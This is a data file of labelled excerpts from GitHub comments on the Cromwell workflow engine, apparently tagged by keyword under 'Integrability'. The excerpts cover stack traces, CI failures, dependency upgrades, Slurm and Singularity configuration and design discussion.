scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:10941,message,message,10941,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['message'],['message']
Integrability,"titute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/async/AsyncBackendJobExecutionActor.scala) file, and some of the important stores would be the [ExecutionStore](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/core/src/main/scala/cromwell/core/ExecutionStore.scala), the [BackendJobDescriptor and BackendJobDescriptorKey](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/package.scala#L17-31), which contain the [Call containing the AST](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Call.scala#L10-61) and sequence of [Tasks](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Task.scala). Since the WorkflowManagerActor (WMA) is just an asynchronous queue selecting the workflow based on the root and its dependencies, then it sounds to be just a scheduling pool service submitting to the EJEA, which prepares it for the specific backend. The recovery for the EJEA is assumed to be an uniform designed protocol, which prepares the execution for the specific backend. . Regarding the backend recovery, since at the core the implementations is really Java (even though everything is in Scala), one can save the running state periodically through serialized snapshots, using something like [Apache JavaFlow](http://commons.apache.org/sandbox/commons-javaflow/) or another similar approach. If this becomes too cumbersome and the cost of resubmitting a job to a specific Backend is on the average time-span not excessive, then resubmitting the whole job might be Occam's razor. There are other approaches, depending on the preferability of flexibility, and I am sure I might have miswrote/misinterpreted something here based on my periodic analysis of the source code - so feel free to correct me :). Thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371:1197,depend,dependencies,1197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371,3,"['depend', 'protocol']","['dependencies', 'depending', 'protocol']"
Integrability,"tl;dr I'd like to squash / rebase / merge this despite a test failure during one run since I think that failure was due to unrelated Docker pull issues. So one build for this branch failed:. https://travis-ci.org/broadinstitute/cromwell/builds/113532462. The first failure was a docker test, and looking at this more closely something seems to have gone awry pulling the Docker image. Our build scripts should pre-pull `ubuntu:latest` and normally this takes about 10 seconds and produces a nice success message. In this run the Docker image pull took more than 43 seconds and the success message appears to be cut off:. ```; Pulling repository docker.io/library/ubuntu; age for ubuntu:latest; ```. The Docker test looks like it's going fine until it's time to actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpret",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:504,message,message,504,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,4,['message'],"['message', 'messages']"
Integrability,"tl;dr there's a lot more work to do here and this should not be closed. I made subprojects for `wom`, `wdl`, and `cwl`, but in reality all the WDL stuff was dumped into `wom` rather than `wdl` where it properly belongs. WDL and WOM are currently very entangled, and Cromwell is talking exclusively to WDL interfaces rather than the WOM interfaces it should use.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2308#issuecomment-326322691:305,interface,interfaces,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2308#issuecomment-326322691,2,['interface'],['interfaces']
Integrability,"tl;dr we want a CLI that allows SWR Cromwell to be invoked through an interface that greatly resembles `cwltool`. Per `cwltest`, it might even be a good idea to call it that:. ```; # Add prefixes if running on MacOSX so that boot2docker writes to /Users; with templock:; if 'darwin' in sys.platform and args.tool == 'cwltool':; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2590#issuecomment-328219372:70,interface,interface,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2590#issuecomment-328219372,1,['interface'],['interface']
Integrability,"to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1584,depend,dependency,1584,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452,1,['depend'],['dependency']
Integrability,"tor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Traceback (most recent call; last):; File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 75, in <module>; main(); File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 22, in main; project, account = bootstrapping.GetActiveProjectAndAccount(); File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py"", line 205, in GetActiveProjectAndAccount; project_name = properties.VALUES.core.project.Get(validate=False); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:2018,Message,Message,2018,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['Message'],['Message']
Integrability,ttp.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResult$2(BasicDirectives.scala:66); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(F,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:2218,Rout,RouteConcatenation,2218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['RouteConcatenation']
Integrability,va.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; 905151- at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; 905152- at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; 905153- at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; 905154- at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; 905155- at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; 905156- at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; 905157- at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; 905158- at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; 905159- at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; 905160- at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; 905161- at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; 905162- at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; 905163- at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; 905164- at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72]; 905165- at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37) ~[cromwell.jar:0.19]; 905166- at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94) ~[cromwell.jar:0.19]; 905167- at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; 905168- at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; 905169- at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.ex,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:1344,protocol,protocol,1344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['protocol'],['protocol']
Integrability,"version 24.; didn't run this actual wdl in cloud due to the dependence on many (MANY!) local files. another thing I found was that there might be little ""object storage"" space left: ; ```; Heap; PSYoungGen total 1966592K, used 891894K [0x0000000580100000, 0x00000006a7d80000, 0x0000000800000000); eden space 1965568K, 45% used [0x0000000580100000,0x00000005b6715b20,0x00000005f8080000); from space 1024K, 90% used [0x00000006a7c80000,0x00000006a7d68000,0x00000006a7d80000); to space 1536K, 0% used [0x00000006a7a80000,0x00000006a7a80000,0x00000006a7c00000); ParOldGen total 2513408K, used 2436406K [0x0000000080200000, 0x0000000119880000, 0x0000000580100000); object space 2513408K, 96% used [0x0000000080200000,0x0000000114d4db58,0x0000000119880000); Metaspace used 54568K, capacity 55776K, committed 56112K, reserved 1097728K; class space used 7106K, capacity 7334K, committed 7472K, reserved 1048576K; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276767681:60,depend,dependence,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276767681,1,['depend'],['dependence']
Integrability,"we had emailed Dion about this a few weeks back, he said, . > ""Yep, we do run more tasks in prod, but even with those tasks we can not guarantee 100% of RPCs succeeding. Internally we do retry any backend dependencies silently (may manifest in slightly higher response times), but it's not unexpected to have a few sneak through. For these situations it's advisable to have a backoff / retry for 5xx level errors that are clearly a problem on our end.; > I've checked back on the time range on those two operations, there doesn't seem to be any wide spread issues during that time on our end. We do have monitoring on the unexpected error rates, would you say your error rates are higher than 0.1 or 0.01% ?  (per RPC call vs per operation, as I think you poll each operation a significant number of times?)."". In conversation, Miguel said:. > ""We have a retry on this call, but it does not back off very aggressively. I'll make a note of it with the Cromwell devs."". Almost all of these failures happened on 5/25. It seems like JES is mostly available, but when unavailable this error causes almost everything running to fail.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/903#issuecomment-222799850:205,depend,dependencies,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/903#issuecomment-222799850,1,['depend'],['dependencies']
Integrability,"well-system-akka.dispatchers.backend-dispatcher-101 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,977 cromwell-system-akka.dispatchers.engine-dispatcher-57 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.engine-dispatcher-67 INFO - WorkflowManagerActor WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030 is in a terminal state: WorkflowSucceededState; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.io-dispatcher-10 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log to /8ee1f938-a92c-48df-a4cc-7a0683413547/workflow.logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,184 cromwell-system-akka.actor.default-dispatcher-154 INFO - Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/cromwell-service/SubWorkflowStoreActor#1592013866] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030#1939109793] was not delivered. [6] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'ak; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986:3475,Message,Message,3475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986,1,['Message'],['Message']
Integrability,"well/engine/workflow/WorkflowManagerActor.scala: // TODO PBE Restart: to be verified after restart is implemented but these WorkflowSucceededResponse/WorkflowFailedResponse seem useless; ./engine/src/main/scala/cromwell/webservice/CromwellApiService.scala: // TODO: PBE: Certainly want to do something for this! But probably not to the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/jes/src/test/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActorSpec.scala: // TODO: PBE: This spec may run faster by going back to mocks? Also, building the actor ref is copy/pasted a lot; ./supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: /",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:1746,depend,dependencies,1746,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,1,['depend'],['dependencies']
Integrability,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5183,wrap,wrap,5183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['wrap'],['wrap']
Integrability,"writing all of that crap we write to logs is a nontrivial performance impact, but we like logs so we've got to do it. we have a pretty vanilla logging setup, we could be *way* smarter about things in terms of impact to performance. this would help there. . risk of dropping is small and tunable, where as one tunes the risk down so goes the performance gain (and vice versa). one of those things where if you can live with the slight possibility that any particular specific log message never makes it you're AOK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294:479,message,message,479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294,1,['message'],['message']
Integrability,"xecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractG",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6975,message,message,6975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['message'],['message']
Integrability,"y could have a role as a backend for; workflow systems, but it's ineffective to take that idea as a starting; point. I really agree that it's best to lay that idea to rest and focus on; the biggest impact / low hanging fruit . To be honest, Singularity as a workflow componetn is exactly the way I've; been using Singularity in real life, whereas the idea to use it as a; workflow backbone always remained ... just an idea. This is not because; Singularity lacks potential there, but mostly because workflow backbones; have complex requirements, and trying to fit a new tool to them that wasn't; made for it in the first place is not trivial. Moving Singularity out of the role of the backend and into the role of a; workflow component, more specifically a container that understands its; data, also introduces the room to give it its own subfunctions, variables,; metadata, tags, etc. This makes the starting point plainly obvious. You can just take the; location where you mention the location of the executable, and put the; wrapper to your singularity image there. I bet this is what most people do; anyway. A next step would be to give it its own section within the workflow; components. Maybe the comment of oneillkza is a high impact one, just; define Singularity as a CAP/ISOblablabla compliant workflow component; within Cromwell. Another take (and not per se mutually exclusive from the take mentioned; above) would be to, again, fix Singularity as a workflow component, and; create a set of options and functions around it that focus on abstraction; of data access etcetera. Very curious where this will go, and thanks so much Vanessa for rethinking; the approach!. Gr. Pim. On Tue, Aug 28, 2018 at 3:12 AM Vanessa Sochat <notifications@github.com>; wrote:. > Hey everyone!; >; > I've been thinking more about this and testing, and I want to offer my; > thoughts here.; > I think overall my conclusions are:; >; > - We are trying to shove Singularity in as a backend *and* a workflow; > co",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:1206,wrap,wrapper,1206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['wrap'],['wrapper']
Integrability,"~The values in `AdditionalRetryableHttpCodes` are evaluated against `gcs.getCode` not `gcs.getMessage`, so the fact the error copy is different shouldn't matter (so I _think_ it should work for you)~. nvm, obviously did not fully understand your message before replying 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5113#issuecomment-521676544:246,message,message,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5113#issuecomment-521676544,1,['message'],['message']
Integrability,"~~Am I correct in saying that this PR doesn't capture error messages coming from JES (polling, job creation, job failed...) ?~~; Nop, the error is bubbled up from JES Backend in `Call***Failure`s my bad.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/475#issuecomment-190207686:60,message,messages,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/475#issuecomment-190207686,1,['message'],['messages']
Integrability,👍 assuming tests all pass. I feel like a while back some specs were checking waiting on certain `info` log messages. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1421/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1421#issuecomment-247414190:107,message,messages,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1421#issuecomment-247414190,1,['message'],['messages']
